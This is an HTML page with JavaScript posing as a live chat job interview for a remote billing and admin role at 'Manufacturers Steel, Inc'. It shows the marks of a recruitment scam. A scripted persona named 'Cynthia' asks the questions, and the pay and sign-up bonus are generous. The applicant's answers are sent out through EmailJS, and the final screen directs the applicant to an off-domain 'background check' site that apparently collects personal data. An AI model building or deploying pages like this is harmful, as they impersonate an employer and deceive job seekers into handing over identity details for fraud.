<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Manufacturers Steel Interview</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<style>
body{
  margin:0;
  background:#f1f2f4;
  font-family:Arial,Helvetica,sans-serif;
}
.container{
  max-width:700px;
  margin:40px auto;
  background:white;
  padding:40px;
  border-radius:10px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
}
.logo{
  text-align:center;
  font-size:28px;
  font-weight:bold;
  margin-bottom:20px;
}
.question{
  font-size:20px;
  margin-bottom:20px;
  line-height:1.5;
}
input{
  width:100%;
  padding:14px;
  font-size:16px;
  border:1px solid #ddd;
  border-radius:6px;
  margin-bottom:10px;
}
.error{
  font-size:14px;
  color:#dc2626;
  margin-bottom:15px;
  display:none;
}
button{
  background:#ff6a00;
  color:white;
  border:none;
  padding:14px 30px;
  font-size:18px;
  border-radius:30px;
  cursor:pointer;
}
button:hover{ opacity:.9; }
.progress{
  font-size:14px;
  color:#666;
  margin-bottom:20px;
  text-align:right;
}
</style>
</head>

<body>
<div class="container">
  <div class="logo">MANUFACTURERS STEEL, INC</div>
  <div class="progress" id="progress"></div>
  <div class="question" id="questionText"></div>
  <input id="answerInput" />
  <div class="error" id="errorText">Please enter your answer to continue.</div>
  <button onclick="nextQuestion()">Next</button>
</div>

<script>
emailjs.init("3PXsfITe9J9_Y5Jxj");

const questions = [
"Hi, Iâ€™m Cynthia, and Iâ€™ll be conducting your live chat interview today.\n\nBefore we begin.\n\nCompany Overview:\nManufacturers Steel Company is a family-owned steel service center based in Springville, California. Established in 1951, we are known for quality steel products, competitive pricing, and dependable customer service. We serve clients nationwide, supporting fabricators, OEMs, job shops, and contractors.\n\nRole Overview:\nThis position combines administrative support and billing-related responsibilities, including recordkeeping, invoicing, payment tracking, customer communication, and task follow-ups. Overtime opportunities may be available when required.\n\nBenefits Include:\nâ€¢ Paid remote training\nâ€¢ Flexible scheduling\nâ€¢ Equipment support (if applicable)\nâ€¢ Sign-up/Welcome Bonus of $500â€“$750 upon successful completion of training\n\nTraining is fully remote and designed to help you quickly become comfortable with our systems.\n\nPlease note: You must be located in the U.S. and legally authorized to work.\n\nPlease confirm the position youâ€™re applying for to continue.",
"Can you confirm where you are currently located?",
"The starting pay is $30/hr up to $35/hr. Does this compensation work for you?",
"What type of schedule are you seeking â€” full-time, part-time, or flexible?",
"Tell us a little about yourself and your professional background.",
"What interested you in this role with MANUFACTURERS STEEL, INC?",
"Do you have experience with administrative tasks such as data entry, recordkeeping, scheduling, or customer support?",
"Have you worked with billing-related tasks like invoices, payment tracking, or resolving billing questions?",
"How do you ensure accuracy and attention to detail when managing multiple tasks or financial records?",
"If a customer contacts you with a billing concern or urgent issue, how would you handle it?",
"If you receive a task that is unclear or missing information, what would you do?",
"Are you comfortable communicating professionally with customers and internal teams through email, chat, and phone?",
"Share an example of a time you caught an error or prevented a problem.",
"If you notice repeated billing or admin issues from the same process, how would you address it?",
"What would you do if you were unsure how to complete a task?",
"How do you stay organized and productive while working remotely?",
"What software tools or technical skills help you succeed in admin and billing support?",
"How do you maintain a professional tone in emails or chat?",
"This position requires a background check. Are you comfortable proceeding?",
"Before we wrap up, is there anything else you'd like us to know?"
];

let current = 0;
let answers = [];

const qText = document.getElementById("questionText");
const progress = document.getElementById("progress");
const input = document.getElementById("answerInput");
const errorText = document.getElementById("errorText");

function showQuestion(){
  qText.innerText = questions[current];
  progress.innerText = "Question " + (current+1) + " of " + questions.length;
  input.value = "";
  errorText.style.display = "none";
  input.focus();
}

function nextQuestion(){
  if(!input.value.trim()){
    errorText.style.display = "block";
    return;
  }
  answers.push(input.value.trim());
  current++;
  if(current < questions.length){
    showQuestion();
  } else {
    submitInterview();
  }
}

function submitInterview(){
  document.querySelector(".container").innerHTML = "<h2>Submitting your interview...</h2>";
  let message = "";
  questions.forEach((q,i)=>{
    message += q + "\nAnswer: " + answers[i] + "\n\n";
  });

  emailjs.send(
    "service_cwzrlga",
    "template_lgzkb7s",
    { interview_answers: message }
  ).then(()=>{
    document.querySelector(".container").innerHTML = `
      <h2>âœ… Interview Submitted</h2>
      <p>Thank you for taking the time to complete this interview. We appreciate your interest in <strong>MANUFACTURERS STEEL, INC</strong>.</p>
      <p>Please complete the background check using the link below:</p>
      <p>ðŸ‘‰ <a href="https://manufacturerssteel-verification.vercel.app" target="_blank">
      https://manufacturerssteel-verification.vercel.app</a></p>
      <p>Once completed, our team will review your information and follow up within <strong>12 hours</strong>.</p>
      <p><strong>We look forward to potentially welcoming you to our team.</strong></p>
    `;
  });
}

showQuestion();
</script>
</body>
</html>
